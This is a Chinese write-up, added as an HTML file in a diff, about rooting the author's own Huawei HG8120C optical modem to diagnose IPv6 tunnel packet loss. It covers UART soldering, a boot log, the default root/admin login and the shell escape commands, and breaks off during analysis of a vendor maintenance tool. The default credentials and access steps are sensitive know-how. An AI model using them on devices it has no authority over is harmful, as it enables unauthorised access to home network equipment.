@@ -1,0 +1,1048 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<!-- This manual is for Document, version 1.0.
+
+Copyright (C) years free time team.
+
+Permission is granted to -->
+<!-- Created by GNU Texinfo 6.1, http://www.gnu.org/software/texinfo/ -->
+<head>
+<title>嵌入式Linux系统IPv6-in-IPv4丢包问题浅析</title>
+
+<meta name="description" content="嵌入式Linux系统IPv6-in-IPv4丢包问题浅析">
+<meta name="keywords" content="嵌入式Linux系统IPv6-in-IPv4丢包问题浅析">
+<meta name="resource-type" content="document">
+<meta name="distribution" content="global">
+<meta name="Generator" content="makeinfo">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<link href="#Top" rel="start" title="Top">
+<link href="#SEC_Contents" rel="contents" title="Table of Contents">
+<link href="dir.html#Top" rel="up" title="(dir)">
+<style type="text/css">
+<!--
+a.summary-letter {text-decoration: none}
+blockquote.indentedblock {margin-right: 0em}
+blockquote.smallindentedblock {margin-right: 0em; font-size: smaller}
+blockquote.smallquotation {font-size: smaller}
+div.display {margin-left: 3.2em}
+div.example {margin-left: 3.2em}
+div.lisp {margin-left: 3.2em}
+div.smalldisplay {margin-left: 3.2em}
+div.smallexample {margin-left: 3.2em}
+div.smalllisp {margin-left: 3.2em}
+kbd {font-style: oblique}
+pre.display {font-family: inherit}
+pre.format {font-family: inherit}
+pre.menu-comment {font-family: serif}
+pre.menu-preformatted {font-family: serif}
+pre.smalldisplay {font-family: inherit; font-size: smaller}
+pre.smallexample {font-size: smaller}
+pre.smallformat {font-family: inherit; font-size: smaller}
+pre.smalllisp {font-size: smaller}
+span.nolinebreak {white-space: nowrap}
+span.roman {font-family: initial; font-weight: normal}
+span.sansserif {font-family: sans-serif; font-weight: normal}
+ul.no-bullet {list-style: none}
+-->
+</style>
+
+
+</head>
+
+<body lang="en">
+<h1 class="settitle" align="center">嵌入式Linux系统IPv6-in-IPv4丢包问题浅析</h1>
+
+
+
+
+<a name="SEC_Contents"></a>
+<h2 class="contents-heading">Table of Contents</h2>
+
+<div class="contents">
+
+<ul class="no-bullet">
+  <li><a name="toc-Nei-Rong-Jian-Jie-" href="#g_t_5185_5bb9_7b80_4ecb">1 内容简介</a></li>
+  <li><a name="toc-PWN-Hua-Wei--HG8120C-Guang-Mao-" href="#PWN-_534e_4e3a-HG8120C-_5149_732b">2 PWN 华为 HG8120C 光猫</a>
+  <ul class="no-bullet">
+    <li><a name="toc-Qi-Yin--_0026-Chu-Bu-Pan-Duan-" href="#g_t_95ee_9898_8d77_56e0-_0026-_521d_6b65_5224_65ad">2.1 起因 &amp; 初步判断</a></li>
+    <li><a name="toc-Cai-Ce-" href="#g_t_731c_6d4b">2.2 猜测</a></li>
+    <li><a name="toc-UART-1" href="#UART">2.3 UART</a></li>
+    <li><a name="toc-Lian-Jie-_002cShang-Dian-_002cQi-Dong-" href="#g_t_8fde_63a5_ff0c_4e0a_7535_ff0c_542f_52a8">2.4 连接，上电，启动</a></li>
+    <li><a name="toc-Jie-Duan-Zong-Jie-1" href="#g_t_9636_6bb5_603b_7ed31">2.5 阶段总结1</a></li>
+    <li><a name="toc-Wei-Hu-Shi-Neng-Gong-Ju-" href="#g_t_7ef4_62a4_4f7f_80fd_5de5_5177">2.6 维护使能工具</a>
+    <ul class="no-bullet">
+      <li><a name="toc-Wei-Hu-Shi-Neng-Gong-Ju-Neng-Zuo-Shi-Yao-" href="#g_t_7ef4_62a4_4f7f_80fd_5de5_5177_80fd_505a_4ec0_4e48">2.6.1 维护使能工具能做什么</a></li>
+      <li><a name="toc-Wei-Hu-Shi-Neng-Gong-Ju-De-Gong-Zuo-Yuan-Li-" href="#g_t_7ef4_62a4_4f7f_80fd_5de5_5177_7684_5de5_4f5c_539f_7406">2.6.2 维护使能工具的工作原理</a></li>
+      <li><a name="toc-Zhuan-Ji-" href="#g_t_8f6c_673a">2.6.3 转机</a></li>
+    </ul></li>
+    <li><a name="toc-Jian-Dan-Tian-Zhen-De-Chang-Shi-" href="#g_t_7b80_5355_5929_771f_7684_5c1d_8bd5">2.7 简单天真的尝试</a></li>
+    <li><a name="toc-payload_002ebin-Jie-Gou-Fen-Jie-" href="#payload_002ebin-_7ed3_6784_5206_89e3">2.8 payload.bin 结构分解</a></li>
+    <li><a name="toc-root-shell-1" href="#root-shell">2.9 root shell</a></li>
+  </ul></li>
+  <li><a name="toc-PWN-Hua-Wei--HG8120C-Guang-Mao-Zhi-Hou-" href="#PWN-_534e_4e3a-HG8120C-_5149_732b_4e4b_540e">3 PWN 华为 HG8120C 光猫之后</a>
+  <ul class="no-bullet">
+    <li><a name="toc-Wang-Luo-Tuo-Bu-Jie-Gou-" href="#g_t_7f51_7edc_62d3_6251_7ed3_6784">3.1 网络拓扑结构</a></li>
+    <li><a name="toc-Zai-ONTShang-Shi-Yong--tcpdump-Zhua-Bao-" href="#g_t_5728ONT_4e0a_4f7f_7528-tcpdump-_6293_5305">3.2 在ONT上使用 tcpdump 抓包</a></li>
+    <li><a name="toc-Jie-Jue-Fang-An-" href="#g_t_89e3_51b3_65b9_6848">3.3 解决方案</a></li>
+    <li><a name="toc-Jie-Lun-" href="#g_t_7ed3_8bba">3.4 结论</a></li>
+  </ul></li>
+  <li><a name="toc-HG8120C-Chi-Jiu--root-shell-Ji-Wan-Mei-Jie-Jue--IPv6-Diu-Bao-" href="#HG8120C-_6301_4e45-root-shell-_53ca_5b8c_7f8e_89e3_51b3-IPv6-_4e22_5305">4 HG8120C 持久 root shell 及完美解决 IPv6 丢包</a>
+  <ul class="no-bullet">
+    <li><a name="toc-Cha-Zhao-IPv6_002din_002dIPv4Diu-Bao-De-Zui-Kui-Huo-Shou-" href="#g_t_67e5_627eIPv6_002din_002dIPv4_4e22_5305_7684_7f6a_9b41_7978_9996">4.1 查找IPv6-in-IPv4丢包的罪魁祸首</a></li>
+    <li><a name="toc-Chi-Jiu-root-shell" href="#g_t_6301_4e45root-shell">4.2 持久root shell</a></li>
+    <li><a name="toc-Ru-He-Shi-Xian-Zi-Qi-Dong-" href="#g_t_5982_4f55_5b9e_73b0_81ea_542f_52a8">4.3 如何实现自启动</a></li>
+    <li><a name="toc-Xun-Zhao-Ke-Neng-Bei-You-Dao-De-Cheng-Xu-" href="#g_t_5bfb_627e_53ef_80fd_88ab_8bf1_5bfc_7684_7a0b_5e8f">4.4 寻找可能被诱导的程序</a></li>
+    <li><a name="toc-Chi-Jiu--VS-Bao-Chi-Xi-Tong-Yuan-You-Xing-Wei-" href="#g_t_6301_4e45-VS-_4fdd_6301_7cfb_7edf_539f_6709_884c_4e3a">4.5 持久 VS 保持系统原有行为</a></li>
+    <li><a name="toc-Wan-Zheng-Liu-Cheng-" href="#g_t_5b8c_6574_6d41_7a0b">4.6 完整流程</a></li>
+    <li><a name="toc-Zong-Jie-" href="#g_t_603b_7ed3">4.7 总结</a></li>
+  </ul></li>
+</ul>
+</div>
+
+
+<a name="Top"></a>
+<div class="header">
+<p>
+Next: <a href="#g_t_5185_5bb9_7b80_4ecb" accesskey="n" rel="next">内容简介</a>, Up: <a href="dir.html#Top" accesskey="u" rel="up">(dir)</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="clk-topic"></a>
+<h1 class="top">clk topic</h1>
+
+<p>This manual is for program, version version.
+</p>
+<table class="menu" border="0" cellspacing="0">
+<tr><td align="left" valign="top">&bull; <a href="#g_t_5185_5bb9_7b80_4ecb" accesskey="1">内容简介</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#PWN-_534e_4e3a-HG8120C-_5149_732b" accesskey="2">PWN 华为 HG8120C 光猫</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#PWN-_534e_4e3a-HG8120C-_5149_732b_4e4b_540e" accesskey="3">PWN 华为 HG8120C 光猫之后</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#HG8120C-_6301_4e45-root-shell-_53ca_5b8c_7f8e_89e3_51b3-IPv6-_4e22_5305" accesskey="4">HG8120C 持久 root shell 及完美解决 IPv6 丢包</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+</table>
+
+<hr>
+<a name="g_t_5185_5bb9_7b80_4ecb"></a>
+<div class="header">
+<p>
+Next: <a href="#PWN-_534e_4e3a-HG8120C-_5149_732b" accesskey="n" rel="next">PWN 华为 HG8120C 光猫</a>, Previous: <a href="#Top" accesskey="p" rel="prev">Top</a>, Up: <a href="#Top" accesskey="u" rel="up">Top</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Nei-Rong-Jian-Jie-"></a>
+<h2 class="chapter">1 内容简介</h2>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过捣鼓了几天的PWN华为HG8120C光猫之后，发现该光猫有IPv6丢包现象。怀疑某个内核驱动对 IPv6-in-IPv4 数据包进行了错误转发，也可能问题模块是作为 built-in 编译在内核里面。
+本文通过控制变量的方法逐个排查所有可疑模块，最终找到引起丢包的冗余模块。最后给出了在保证fail safe，不损坏设备，网络和电话功能正常的前提下，
+通过获取持久root  shell实现设备掉电重启后，自动移除引起丢包的冗余模块的解决方案。
+</p>
+<hr>
+<a name="PWN-_534e_4e3a-HG8120C-_5149_732b"></a>
+<div class="header">
+<p>
+Next: <a href="#PWN-_534e_4e3a-HG8120C-_5149_732b_4e4b_540e" accesskey="n" rel="next">PWN 华为 HG8120C 光猫之后</a>, Previous: <a href="#g_t_5185_5bb9_7b80_4ecb" accesskey="p" rel="prev">内容简介</a>, Up: <a href="#Top" accesskey="u" rel="up">Top</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="PWN-Hua-Wei--HG8120C-Guang-Mao-"></a>
+<h2 class="chapter">2 PWN 华为 HG8120C 光猫</h2>
+
+<table class="menu" border="0" cellspacing="0">
+<tr><td align="left" valign="top">&bull; <a href="#g_t_95ee_9898_8d77_56e0-_0026-_521d_6b65_5224_65ad" accesskey="1">问题起因 &amp; 初步判断</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#g_t_731c_6d4b" accesskey="2">猜测</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#UART" accesskey="3">UART</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#g_t_8fde_63a5_ff0c_4e0a_7535_ff0c_542f_52a8" accesskey="4">连接，上电，启动</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#g_t_9636_6bb5_603b_7ed31" accesskey="5">阶段总结1 </a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#g_t_7ef4_62a4_4f7f_80fd_5de5_5177" accesskey="6">维护使能工具</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#g_t_7b80_5355_5929_771f_7684_5c1d_8bd5" accesskey="7">简单天真的尝试</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#payload_002ebin-_7ed3_6784_5206_89e3" accesskey="8">payload.bin 结构分解</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#root-shell" accesskey="9">root shell</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+</table>
+
+<hr>
+<a name="g_t_95ee_9898_8d77_56e0-_0026-_521d_6b65_5224_65ad"></a>
+<div class="header">
+<p>
+Next: <a href="#g_t_731c_6d4b" accesskey="n" rel="next">猜测</a>, Up: <a href="#PWN-_534e_4e3a-HG8120C-_5149_732b" accesskey="u" rel="up">PWN 华为 HG8120C 光猫</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Qi-Yin--_0026-Chu-Bu-Pan-Duan-"></a>
+<h3 class="section">2.1 起因 &amp; 初步判断</h3>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;家里网络更换了光猫(ONT)，由HG8120R换成了HG8120C，均系华为生产，ISP提供。
+事后发现原来完美工作的IPv6-in-IPv4 tunnel丢包严重，达到90%以上。由于ONT是唯一变更了的设备，所以可以几乎100%确认是新的ONT HG8120C造成的丢包。
+于是在过去的几个星期里，PWN新ONT设备便成了我闲暇时光的主要工作，最终成功pwned，获取了root shell。
+</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;更换设备后，很快发现访问IPv6出现困难，完全不能打开网页，马上使用ping6进行诊断，得到了如下很有规律的结果：
+</p><div class="example">
+<pre class="example">    leexiaolan@localhost $ ping6 2001:4860:4860::8888
+    PING 2001:4860:4860::8888(2001:4860:4860::8888) 56 data bytes
+    64 bytes from 2001:4860:4860::8888: icmp_seq=1 ttl=56 time=416 ms
+    64 bytes from 2001:4860:4860::8888: icmp_seq=17 ttl=56 time=419 ms
+    64 bytes from 2001:4860:4860::8888: icmp_seq=33 ttl=56 time=415 ms
+    64 bytes from 2001:4860:4860::8888: icmp_seq=49 ttl=56 time=423 ms
+    64 bytes from 2001:4860:4860::8888: icmp_seq=65 ttl=56 time=427 ms
+    64 bytes from 2001:4860:4860::8888: icmp_seq=80 ttl=56 time=426 ms
+    64 bytes from 2001:4860:4860::8888: icmp_seq=96 ttl=56 time=358 ms
+    ^C
+    --- 2001:4860:4860::8888 ping statistics ---
+    97 packets transmitted, 7 received, 92% packet loss, time 96013ms
+    rtt min/avg/max/mdev = 358.180/412.373/427.908/22.604 ms
+</pre></div>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从结果来看，链路中某个设备，每16个数据包会丢掉其中的15个，仅有一个通过，丢包率高达15/16=93.75%。
+得到这样的结果，考虑到tunnel server在香港，第一反应这个丢包的设备是GFW。
+于是换国内某云服务商的机器做tunnel server测试，ping6的目标地址就是tunnel server自身的IPv6地址，也得到了类似结果，所以，GFW的嫌疑洗清了。
+</p>
+<hr>
+<a name="g_t_731c_6d4b"></a>
+<div class="header">
+<p>
+Next: <a href="#UART" accesskey="n" rel="next">UART</a>, Previous: <a href="#g_t_95ee_9898_8d77_56e0-_0026-_521d_6b65_5224_65ad" accesskey="p" rel="prev">问题起因 &amp; 初步判断</a>, Up: <a href="#PWN-_534e_4e3a-HG8120C-_5149_732b" accesskey="u" rel="up">PWN 华为 HG8120C 光猫</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Cai-Ce-"></a>
+<h3 class="section">2.2 猜测</h3>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这时，刚换的ONT设备的嫌疑就陡然上升了。
+使用设备提供的useradmin登录ONT的web管理页面，可以看到新ONT可以提供IPv6连接，但是没有启用，也无法手动配置。
+而IPv6这个功能在老ONT上是没有的，这进一步加大了新ONT丢弃IPv6包的嫌疑。
+但由于老ONT HG8120R已经被ISP回收，无法置换回去测试，所以还不能100%确定就是ONT设备丢包。
+即便ONT是我已知的链路中唯一更换的设备，但无法确定ISP的局端设备是否发生变化，所以需要更强的证据来佐证是新ONT丢的包。
+如果可以抓取到ONT光口发出去的数据包，就能……，很不幸手上没有这样的设备，买个这样的设备估计也不会很便宜。
+所以，剩下唯一的途径就从ONT下手，在ONT内部抓取数据包。
+</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;之前老的ONT已经PWNED，知道设备运行Linux kernel，Hisilicon（其母公司是华为）的ARM CPU。
+要在这样的设备上抓包，需要两个条件：一是抓包软件，二是root shell。
+第一个条件容易满足，交叉编译ARM处理器的tcpdump即可，我之前已经为HG8120R静态链接编译了tcpdump，应该可以直接使用，就差root shell了。
+</p>
+<hr>
+<a name="UART"></a>
+<div class="header">
+<p>
+Next: <a href="#g_t_8fde_63a5_ff0c_4e0a_7535_ff0c_542f_52a8" accesskey="n" rel="next">连接，上电，启动</a>, Previous: <a href="#g_t_731c_6d4b" accesskey="p" rel="prev">猜测</a>, Up: <a href="#PWN-_534e_4e3a-HG8120C-_5149_732b" accesskey="u" rel="up">PWN 华为 HG8120C 光猫</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="UART-1"></a>
+<h3 class="section">2.3 UART</h3>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以往的经验告诉我，这样的设备都有一个UART debug port，焊上对应信号线，root shell马上就有了，就像给机柜中的服务器插上显示器和键盘。
+只是这种方法需要拆开设备外壳包装，在电路板上找到对应针脚。一番观察之后，确定HG8120C外壳只用一颗螺丝和机壳周围一圈多个卡口固定。
+尽量不弄坏卡口，同时也保护好外观，小心翼翼地拆开机器外壳，取出电路板，马上就发现下图的五个针脚焊盘J4：
+</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="hg8120c-uart-pin.png" alt="hg8120c-uart-pin">
+HG8120C UART pin
+</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;针脚定义与Practical Reverse Engineering Part 1 - Hunting for Debug Ports中相同，
+唯一例外就是上图中红框标注的两个电阻R231和R232缺失，而这两个电阻刚好是1和5脚，也就是Rx和Tx与电路连接的唯一通路，
+焊上两个100欧电阻或直接将TTL线焊接在中间两个焊点上即可。
+</p>
+<hr>
+<a name="g_t_8fde_63a5_ff0c_4e0a_7535_ff0c_542f_52a8"></a>
+<div class="header">
+<p>
+Next: <a href="#g_t_9636_6bb5_603b_7ed31" accesskey="n" rel="next">阶段总结1</a>, Previous: <a href="#UART" accesskey="p" rel="prev">UART</a>, Up: <a href="#PWN-_534e_4e3a-HG8120C-_5149_732b" accesskey="u" rel="up">PWN 华为 HG8120C 光猫</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Lian-Jie-_002cShang-Dian-_002cQi-Dong-"></a>
+<h3 class="section">2.4 连接，上电，启动</h3>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;焊接好三根信号线，和电脑上使用的USB转串口设备连接，剩下就只用确定几个协议参数了。
+多数情况下除了波特率，其它参数都是默认值。波特率通常也都是使用那几个知名的速率，挨个试一遍就可以找到了。
+我运气很好，第一次试用115200便对了，上电启动设备，屏幕上很快就滚过下面这些信息：
+</p>
+<div class="example">
+<pre class="example">    leexiaolan@localhost $ sudo screen /dev/ttyUSB0 115200
+
+    HuaWei StartCode 2012.02 (R15C10 Apr 03 2015 - 01:24:45)
+
+    NAND:  NAND FLASH Enter Low Driver Mode
+    Nand(Hardware): 128 MiB
+    startcode select the uboot to load
+    the high RAM is :8080103c
+    startcode uboot boot count:71872272
+    use the main slave_param area from flash, the RAM data is not OK!!!
+    Use the UbootA to load first
+    Use the UbootA to load success
+
+    U-Boot 2010.03 (R15C10 Jun 29 2015 - 17:21:21)
+
+    DRAM:  128 MB
+    Boot From NAND flash
+    Chip Type is SD5116H
+    ...
+    waitForPADO: wait for PADO on wan3 10 sec.
+    profile close core dump
+    Press any key to get started
+
+    telnet port:23
+    Open device /dev/pts/2 OK!
+    Entering character mode
+    Escape character is '^]'.
+
+    Welcome Visiting Huawei Home Gateway
+    Copyright by Huawei Technologies Co., Ltd.
+
+    Login:
+</pre></div>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;提示输入用户名，尝试常见的几个用户名密码组合，最后用户名root，密码admin成功登录了。
+</p><div class="example">
+<pre class="example">    Login:root
+    Password:
+    WAP&gt;
+</pre></div>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;得到了WAP&gt;提示符，输入shell和debugshell等命令都提示命令不存在。
+</p><div class="example">
+<pre class="example">    WAP&gt;shell
+    ERROR::Command is not existed
+
+    WAP&gt;debugshell
+    ERROR::Command is not existed
+</pre></div>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Google一番后，原来是需要先使用su进入特权模式，再使用shell命令。
+</p>
+<div class="example">
+<pre class="example">    WAP&gt;su
+    success!
+    SU_WAP&gt;shell
+
+    BusyBox v1.18.4 (2015-06-27 14:02:58 CST) built-in shell (ash)
+    Enter 'help' for a list of built-in commands.
+
+    profile close core dump
+    WAP(Dopra Linux) #
+</pre></div>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;嗯，看到熟悉的BusyBox了，心中一阵喜悦。可惜这段喜悦没能延续很长时间，尝试输入两个命令后就彻底绝望了。
+</p>
+<div class="example">
+<pre class="example">    WAP(Dopra Linux) # ls
+    /bin/sh: wap.ls: not found
+    WAP(Dopra Linux) # ps
+    ERROR::Command is not existed
+
+    WAP(Dopra Linux) # help
+    ERROR::Command is not existed
+
+    WAP(Dopra Linux) # ?
+    boardtype.sh
+    clcmcheck.sh
+    customize.sh
+    EquipMode.sh
+    exit
+    getcustominfo.sh
+    getcustomize.sh
+    ifconfig
+    iwconfig
+    ...
+</pre></div>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BusyBox是假的，还是只能执行几个有限的命令。
+失望之余，只能寄希望于看能不能在这三个WAP&gt;，SU_WAP&gt;和WAP(Dopra Linux) #提示符下找到任何一个可以利用的命令，于是开始了一个无聊的循环，
+一个命令一个命令的尝试，了解其作用，最后得出令人心塞的结论：全军覆没，没有一个可以用于执行任意代码。
+</p>
+<hr>
+<a name="g_t_9636_6bb5_603b_7ed31"></a>
+<div class="header">
+<p>
+Next: <a href="#g_t_7ef4_62a4_4f7f_80fd_5de5_5177" accesskey="n" rel="next">维护使能工具</a>, Previous: <a href="#g_t_8fde_63a5_ff0c_4e0a_7535_ff0c_542f_52a8" accesskey="p" rel="prev">连接，上电，启动</a>, Up: <a href="#PWN-_534e_4e3a-HG8120C-_5149_732b" accesskey="u" rel="up">PWN 华为 HG8120C 光猫</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Jie-Duan-Zong-Jie-1"></a>
+<h3 class="section">2.5 阶段总结1</h3>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;到目前为止，厂商的安全措施做得还不错，还没有发现明显可以利用的漏洞。那么，下一步该如何进行呢？仔细思考了一会，大概还有如下几个途径：
+</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1. 使用jTAG直接读写Flash。这种方法的不方便在于，需要处理系统本身的文件系统数据结构以及uboot对数据的校验等信息。
+另外，jTAG针脚比UART多，电路板上也没有明显标记，在没有CPU的数据手册情况下，很难确定针脚定义。
+</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 . 使用Flash编程器在线或焊下芯片离线读写Flash。这种操作Flash的方式更困难，
+还需要考虑<a href="https://community.saas.hpe.com/t5/Security-Research/Reverse-engineering-NAND-Flash-for-fun-and-profit/ba-p/274851#.Wa_CkfgjEao">Flash的OOB数据。</a>
+</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3. 如何中断uboot，得到uboot cli，从而修改Flash或从网络加载kernel等。
+</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4. 找Web管理页面或命令行参数注入漏洞。
+</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5. 修改firmware升级包，WAP&gt;提示符下使用load pack升级。
+</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6. 厂商隐藏的其它后门。
+</p>
+<hr>
+<a name="g_t_7ef4_62a4_4f7f_80fd_5de5_5177"></a>
+<div class="header">
+<p>
+Next: <a href="#g_t_7b80_5355_5929_771f_7684_5c1d_8bd5" accesskey="n" rel="next">简单天真的尝试</a>, Previous: <a href="#g_t_9636_6bb5_603b_7ed31" accesskey="p" rel="prev">阶段总结1</a>, Up: <a href="#PWN-_534e_4e3a-HG8120C-_5149_732b" accesskey="u" rel="up">PWN 华为 HG8120C 光猫</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Wei-Hu-Shi-Neng-Gong-Ju-"></a>
+<h3 class="section">2.6 维护使能工具</h3>
+
+<table class="menu" border="0" cellspacing="0">
+<tr><td align="left" valign="top">&bull; <a href="#g_t_7ef4_62a4_4f7f_80fd_5de5_5177_80fd_505a_4ec0_4e48" accesskey="1">维护使能工具能做什么</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#g_t_7ef4_62a4_4f7f_80fd_5de5_5177_7684_5de5_4f5c_539f_7406" accesskey="2">维护使能工具的工作原理</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#g_t_8f6c_673a" accesskey="3">转机</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+</table>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于厂商采取了一定的安全预防措施，试图通过UART来PWN ONT HG8120C的尝试出人意料的失败了，但是这并不能摧毁我不达目的不罢休的决心，
+又尝试了多种方法，还是未能成功。
+难道非得使用直接读写Flash芯片（这种方法风险较大，可能损坏设备。同时设备也不能用，会断网，家里人会很生气，后果很严重。
+所以在还有其它可能的情况下，是不会轻易使用这种方法的。）
+这个终极法宝了？几乎绝望之际，想起来网上流传的厂商维护使能工具，又燃起了一丝希望。
+</p>
+<hr>
+<a name="g_t_7ef4_62a4_4f7f_80fd_5de5_5177_80fd_505a_4ec0_4e48"></a>
+<div class="header">
+<p>
+Next: <a href="#g_t_7ef4_62a4_4f7f_80fd_5de5_5177_7684_5de5_4f5c_539f_7406" accesskey="n" rel="next">维护使能工具的工作原理</a>, Up: <a href="#g_t_7ef4_62a4_4f7f_80fd_5de5_5177" accesskey="u" rel="up">维护使能工具</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Wei-Hu-Shi-Neng-Gong-Ju-Neng-Zuo-Shi-Yao-"></a>
+<h4 class="subsection">2.6.1 维护使能工具能做什么</h4>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该工具用于厂商售后，所谓使能，就是开启设备的维护模式，并关闭防火墙对telnet 23端口的访问限制。
+使能后，telnet终端能够完成的设备维护的全部操作（UART得到的命令行其实就是这个telnet终端），但对于我的目的，得到root shell并运行tcpdump来说，毫无用处。
+所以，引起我兴趣的不是使能后能做什么，而是使能工具如何和设备交互，发出使能命令的，说不定也能发出其它命令，比如就像我期望的tcpdump。
+</p>
+<hr>
+<a name="g_t_7ef4_62a4_4f7f_80fd_5de5_5177_7684_5de5_4f5c_539f_7406"></a>
+<div class="header">
+<p>
+Next: <a href="#g_t_8f6c_673a" accesskey="n" rel="next">转机</a>, Previous: <a href="#g_t_7ef4_62a4_4f7f_80fd_5de5_5177_80fd_505a_4ec0_4e48" accesskey="p" rel="prev">维护使能工具能做什么</a>, Up: <a href="#g_t_7ef4_62a4_4f7f_80fd_5de5_5177" accesskey="u" rel="up">维护使能工具</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Wei-Hu-Shi-Neng-Gong-Ju-De-Gong-Zuo-Yuan-Li-"></a>
+<h4 class="subsection">2.6.2 维护使能工具的工作原理</h4>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该工具是运行在 Windows 上的一个可执行文件，
+想了解其工作原理，有两个办法：一是对exe进行逆向工程，二是抓包分析其发送的数据（其实不能算分析，纯粹瞎猜各个字节的意义，然后小心求证罢了）。
+使用dumpbin查看exe文件：
+</p>
+<div class="example">
+<pre class="example">    D:\tmp&gt;dumpbin /summary ONT.exe
+    Microsoft (R) COFF Binary File Dumper Version 6.00.8447
+    Copyright (C) Microsoft Corp 1992-1998. All rights reserved.
+
+    Dump of file D:\tmp\ONT.exe
+
+    File Type: EXECUTABLE IMAGE
+
+      Summary
+
+            2000 .text
+            2000 HWB8zP1w
+            1000 LEXmTy1n
+          216000 QrVbjeUa
+          20E000 lS8TSGXu
